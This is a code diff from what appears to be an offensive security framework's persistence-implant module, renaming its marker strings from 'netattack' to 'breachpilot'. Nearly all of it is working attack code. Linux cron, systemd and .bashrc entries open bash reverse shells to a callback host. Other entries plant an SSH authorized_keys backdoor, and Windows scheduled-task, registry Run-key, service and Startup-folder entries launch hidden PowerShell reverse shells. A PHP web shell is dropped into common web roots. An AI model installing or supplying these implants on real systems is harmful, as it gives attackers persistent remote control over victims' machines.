@@ -57,7 +57,7 @@ try:
     except Exception:
         user="root"
     cron_file=os.path.join(cron_dir, user) if cron_dir=="/var/spool/cron" else os.path.join(cron_dir, "root")
-    payload="*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1' # netattack-persist"
+    payload="*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1' # breachpilot-persist"
     try:
         with open(cron_file,"a") as fh:
             fh.write(payload+"\n")
@@ -78,8 +78,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: cron")
 """,
-    verify_cmd="crontab -l 2>/dev/null | grep -c netattack-persist; cat /var/spool/cron/crontabs/* 2>/dev/null | grep -c netattack-persist; echo VERIFY_DONE",
-    remove_cmd="crontab -l 2>/dev/null | grep -v netattack-persist | crontab - 2>/dev/null; sed -i '/netattack-persist/d' /var/spool/cron/crontabs/* 2>/dev/null; echo REMOVED",
+    verify_cmd="crontab -l 2>/dev/null | grep -c breachpilot-persist; cat /var/spool/cron/crontabs/* 2>/dev/null | grep -c breachpilot-persist; echo VERIFY_DONE",
+    remove_cmd="crontab -l 2>/dev/null | grep -v breachpilot-persist | crontab - 2>/dev/null; sed -i '/breachpilot-persist/d' /var/spool/cron/crontabs/* 2>/dev/null; echo REMOVED",
 )
 
 _LINUX_SYSTEMD = ImplantSpec(
@@ -98,12 +98,12 @@ results={{"method":"linux_systemd","installed":False,"path":"","errors":[]}}
 try:
     unit_dir=os.path.expanduser("~/.config/systemd/user")
     os.makedirs(unit_dir, exist_ok=True)
-    unit_path=os.path.join(unit_dir,"netattack-persist.service")
-    body="[Unit]\nDescription=NetAttack persist\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1'\nRestart=always\nRestartSec=300\n[Install]\nWantedBy=default.target\n"
+    unit_path=os.path.join(unit_dir,"breachpilot-persist.service")
+    body="[Unit]\nDescription=BreachPilot persist\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1'\nRestart=always\nRestartSec=300\n[Install]\nWantedBy=default.target\n"
     with open(unit_path,"w") as fh:
         fh.write(body)
     subprocess.run(["systemctl","--user","daemon-reload"],capture_output=True,timeout=10)
-    subprocess.run(["systemctl","--user","enable","--now","netattack-persist.service"],capture_output=True,timeout=10)
+    subprocess.run(["systemctl","--user","enable","--now","breachpilot-persist.service"],capture_output=True,timeout=10)
     results["installed"]=True
     results["path"]=unit_path
 except Exception as e:
@@ -111,8 +111,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: systemd")
 """,
-    verify_cmd="systemctl --user is-enabled netattack-persist.service 2>/dev/null; ls -la ~/.config/systemd/user/netattack-persist.service 2>/dev/null; echo VERIFY_DONE",
-    remove_cmd="systemctl --user disable --now netattack-persist.service 2>/dev/null; rm -f ~/.config/systemd/user/netattack-persist.service; systemctl --user daemon-reload 2>/dev/null; echo REMOVED",
+    verify_cmd="systemctl --user is-enabled breachpilot-persist.service 2>/dev/null; ls -la ~/.config/systemd/user/breachpilot-persist.service 2>/dev/null; echo VERIFY_DONE",
+    remove_cmd="systemctl --user disable --now breachpilot-persist.service 2>/dev/null; rm -f ~/.config/systemd/user/breachpilot-persist.service; systemctl --user daemon-reload 2>/dev/null; echo REMOVED",
 )
 
 _LINUX_SSH_KEY = ImplantSpec(
@@ -129,10 +129,10 @@ results={{"method":"linux_ssh_key","installed":False,"pubkey":"","path":"","erro
 try:
     ssh_dir=os.path.expanduser("~/.ssh")
     os.makedirs(ssh_dir,mode=0o700,exist_ok=True)
-    key_path=os.path.join(ssh_dir,"netattack_persist_ed25519")
+    key_path=os.path.join(ssh_dir,"breachpilot_persist_ed25519")
     ak_path=os.path.join(ssh_dir,"authorized_keys")
     if not (os.path.exists(key_path) and os.path.exists(key_path+".pub")):
-        subprocess.run(["ssh-keygen","-t","ed25519","-f",key_path,"-N","","-C","netattack@persist"],capture_output=True,timeout=30)
+        subprocess.run(["ssh-keygen","-t","ed25519","-f",key_path,"-N","","-C","breachpilot@persist"],capture_output=True,timeout=30)
     pub=""
     if os.path.exists(key_path+".pub"):
         with open(key_path+".pub") as fh:
@@ -157,8 +157,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: authorized_keys")
 """,
-    verify_cmd="grep -c netattack@persist ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null | grep netattack; echo VERIFY_DONE",
-    remove_cmd="sed -i '/netattack@persist/d' ~/.ssh/authorized_keys 2>/dev/null; rm -f ~/.ssh/netattack_persist_ed25519 ~/.ssh/netattack_persist_ed25519.pub; echo REMOVED",
+    verify_cmd="grep -c breachpilot@persist ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null | grep breachpilot; echo VERIFY_DONE",
+    remove_cmd="sed -i '/breachpilot@persist/d' ~/.ssh/authorized_keys 2>/dev/null; rm -f ~/.ssh/breachpilot_persist_ed25519 ~/.ssh/breachpilot_persist_ed25519.pub; echo REMOVED",
 )
 
 _LINUX_BASHRC = ImplantSpec(
@@ -176,7 +176,7 @@ CB_PORT="{callback_port}"
 results={{"method":"linux_bashrc","installed":False,"path":"","errors":[]}}
 try:
     rc=os.path.expanduser("~/.bashrc")
-    marker="# netattack-persist"
+    marker="# breachpilot-persist"
     payload="bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1 & "+marker
     existing=""
     if os.path.exists(rc):
@@ -192,8 +192,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: bashrc")
 """,
-    verify_cmd="grep -c netattack-persist ~/.bashrc 2>/dev/null; grep netattack-persist ~/.bashrc 2>/dev/null; echo VERIFY_DONE",
-    remove_cmd="sed -i '/netattack-persist/d' ~/.bashrc 2>/dev/null; sed -i '/netattack-persist/d' ~/.profile 2>/dev/null; echo REMOVED",
+    verify_cmd="grep -c breachpilot-persist ~/.bashrc 2>/dev/null; grep breachpilot-persist ~/.bashrc 2>/dev/null; echo VERIFY_DONE",
+    remove_cmd="sed -i '/breachpilot-persist/d' ~/.bashrc 2>/dev/null; sed -i '/breachpilot-persist/d' ~/.profile 2>/dev/null; echo REMOVED",
 )
 
 # --- Windows implants ---------------------------------------------------------
@@ -214,7 +214,7 @@ results={{"method":"windows_schtask","installed":False,"errors":[]}}
 def _ps(cmd):
     return subprocess.run(["powershell","-NoProfile","-ExecutionPolicy","Bypass","-Command",cmd],capture_output=True,text=True,timeout=30)
 try:
-    create="$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'"+CB_HOST+"\\',"+CB_PORT+");$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}}; $c.Close()\"'; $t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5); $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'NetAttackPersist' -Action $a -Trigger $t -Principal $p -Force"
+    create="$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'"+CB_HOST+"\\',"+CB_PORT+");$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}}; $c.Close()\"'; $t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5); $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'BreachPilotPersist' -Action $a -Trigger $t -Principal $p -Force"
     proc=_ps(create)
     results["installed"]=proc.returncode==0
     results["stdout"]=proc.stdout[-500:]
@@ -224,14 +224,14 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: schtask")
 """,
-    verify_cmd='powershell -NoProfile -Command "Get-ScheduledTask -TaskName NetAttackPersist -ErrorAction SilentlyContinue | Format-List TaskName,State; schtasks /query /tn NetAttackPersist 2>&1"',
-    remove_cmd='powershell -NoProfile -Command "Unregister-ScheduledTask -TaskName NetAttackPersist -Confirm:$false -ErrorAction SilentlyContinue; schtasks /delete /tn NetAttackPersist /f 2>&1"; echo REMOVED',
+    verify_cmd='powershell -NoProfile -Command "Get-ScheduledTask -TaskName BreachPilotPersist -ErrorAction SilentlyContinue | Format-List TaskName,State; schtasks /query /tn BreachPilotPersist 2>&1"',
+    remove_cmd='powershell -NoProfile -Command "Unregister-ScheduledTask -TaskName BreachPilotPersist -Confirm:$false -ErrorAction SilentlyContinue; schtasks /delete /tn BreachPilotPersist /f 2>&1"; echo REMOVED',
 )
 
 _WIN_REGISTRY = ImplantSpec(
     name="windows_registry",
     os_family="windows",
-    description="Registry Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (NetAttackHealth).",
+    description="Registry Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (BreachPilotHealth).",
     mitre_technique="T1547.001",
     requires_root=False,
     beacon_interval="on-logon",
@@ -244,7 +244,7 @@ results={{"method":"windows_registry","installed":False,"errors":[]}}
 def _ps(cmd):
     return subprocess.run(["powershell","-NoProfile","-Command",cmd],capture_output=True,text=True,timeout=30)
 try:
-    cmd="New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'NetAttackHealth' -Value 'powershell.exe -WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+\"PS \"+(pwd).Path+\"> \"; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\"' -PropertyType String -Force"
+    cmd="New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'BreachPilotHealth' -Value 'powershell.exe -WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+\"PS \"+(pwd).Path+\"> \"; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\"' -PropertyType String -Force"
     proc=_ps(cmd)
     results["installed"]=proc.returncode==0
     results["stdout"]=proc.stdout[-500:]
@@ -253,14 +253,14 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: registry")
 """,
-    verify_cmd="powershell -NoProfile -Command \"Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name NetAttackHealth -ErrorAction SilentlyContinue | Format-List\"",
-    remove_cmd="powershell -NoProfile -Command \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name NetAttackHealth -ErrorAction SilentlyContinue\"; echo REMOVED",
+    verify_cmd="powershell -NoProfile -Command \"Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name BreachPilotHealth -ErrorAction SilentlyContinue | Format-List\"",
+    remove_cmd="powershell -NoProfile -Command \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name BreachPilotHealth -ErrorAction SilentlyContinue\"; echo REMOVED",
 )
 
 _WIN_SERVICE = ImplantSpec(
     name="windows_service",
     os_family="windows",
-    description="Windows service NetAttackSvc (auto-start) that beacons via cmd /c powershell reverse shell.",
+    description="Windows service BreachPilotSvc (auto-start) that beacons via cmd /c powershell reverse shell.",
     mitre_technique="T1543.003",
     requires_root=True,
     beacon_interval="on-boot",
@@ -271,7 +271,7 @@ CB_HOST="{callback_host}"
 CB_PORT="{callback_port}"
 results={{"method":"windows_service","installed":False,"errors":[]}}
 try:
-    svc="sc.exe create NetAttackSvc binPath= \"cmd /c powershell -WindowStyle Hidden -Command \\\"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\\\"\" start= auto"
+    svc="sc.exe create BreachPilotSvc binPath= \"cmd /c powershell -WindowStyle Hidden -Command \\\"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\\\"\" start= auto"
     proc=subprocess.run(svc,shell=True,capture_output=True,text=True,timeout=30)
     results["installed"]=proc.returncode==0
     results["output"]=(proc.stdout+proc.stderr)[-800:]
@@ -280,8 +280,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: service")
 """,
-    verify_cmd="sc.exe query NetAttackSvc 2>&1; sc.exe qc NetAttackSvc 2>&1; echo VERIFY_DONE",
-    remove_cmd="sc.exe stop NetAttackSvc 2>&1; sc.exe delete NetAttackSvc 2>&1; echo REMOVED",
+    verify_cmd="sc.exe query BreachPilotSvc 2>&1; sc.exe qc BreachPilotSvc 2>&1; echo VERIFY_DONE",
+    remove_cmd="sc.exe stop BreachPilotSvc 2>&1; sc.exe delete BreachPilotSvc 2>&1; echo REMOVED",
 )
 
 _WIN_STARTUP = ImplantSpec(
@@ -300,7 +300,7 @@ results={{"method":"windows_startup","installed":False,"path":"","errors":[]}}
 try:
     startup=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
     os.makedirs(startup,exist_ok=True)
-    bat=os.path.join(startup,"NetAttackHealth.bat")
+    bat=os.path.join(startup,"BreachPilotHealth.bat")
     body="@echo off\r\npowershell -WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient('"+CB_HOST+"',"+CB_PORT+");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $s.Write(([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}; $c.Close()\"\r\n"
     with open(bat,"w") as fh:
         fh.write(body)
@@ -311,8 +311,8 @@ except Exception as e:
 print(json.dumps(results))
 print("PERSISTENCE_INSTALLED: startup")
 """,
-    verify_cmd='powershell -NoProfile -Command "Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" | Where-Object { $_.Name -like \'*NetAttack*\' } | Format-List Name,FullName"',
-    remove_cmd='powershell -NoProfile -Command "Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetAttackHealth.bat" -Force -ErrorAction SilentlyContinue"; echo REMOVED',
+    verify_cmd='powershell -NoProfile -Command "Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" | Where-Object { $_.Name -like \'*BreachPilot*\' } | Format-List Name,FullName"',
+    remove_cmd='powershell -NoProfile -Command "Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\BreachPilotHealth.bat" -Force -ErrorAction SilentlyContinue"; echo REMOVED',
 )
 
 # --- Web implants -------------------------------------------------------------
@@ -329,7 +329,7 @@ import os, json
 TARGET="{target_ip}"
 results={{"method":"web_php_shell","installed":False,"paths":[],"errors":[]}}
 WEB_ROOTS=["/var/www/html","/var/www","/usr/share/nginx/html","/srv/http","C:\\inetpub\\wwwroot","C:\\xampp\\htdocs"]
-SHELL='<?php // netattack-persist\nif(isset($_REQUEST["netattack_cmd"])){ system($_REQUEST["netattack_cmd"]); } ?>'
+SHELL='<?php // breachpilot-persist\nif(isset($_REQUEST["breachpilot_cmd"])){ system($_REQUEST["breachpilot_cmd"]); } ?>'
 for root in WEB_ROOTS:
     if not os.path.isdir(root):
         continue
